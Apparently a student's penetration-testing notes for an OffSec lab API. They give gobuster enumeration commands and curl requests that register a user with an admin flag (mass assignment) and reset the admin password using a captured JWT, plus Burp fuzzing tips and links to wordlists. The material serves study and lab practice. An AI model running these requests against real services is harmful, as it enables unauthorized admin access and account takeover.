# API

## API enumeration

Gobuster pattern

```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

{% code overflow="wrap" %}
```
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

```
{% endcode %}

Crafting a POST request against the login API

{% code overflow="wrap" %}
```
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```
{% endcode %}

Attempting new user registration

{% code overflow="wrap" %}
```
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
```
{% endcode %}

Attempting to register new user as admin

{% code overflow="wrap" %}
```
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
```
{% endcode %}

Logging in as an admin user

{% code overflow="wrap" %}
```
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```
{% endcode %}

Attempting to change the admin pass via a POST request. POST is not working, then maybe switch to PUT

{% code overflow="wrap" %}
```
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
```
{% endcode %}

Using Burp and Intruder with spider you can try and enumerate the api. google for "api seclists endpoints" to grab of list of payloads.

{% hint style="info" %}
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt)

[https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d](https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d)
{% endhint %}

{% hint style="info" %}
Test for negative values as well "-1" or really big numbers, maybe you get a 500 internal error.
{% endhint %}

API Security Checklist

{% hint style="info" %}
[https://github.com/shieldfy/API-Security-Checklist](https://github.com/shieldfy/API-Security-Checklist)
{% endhint %}
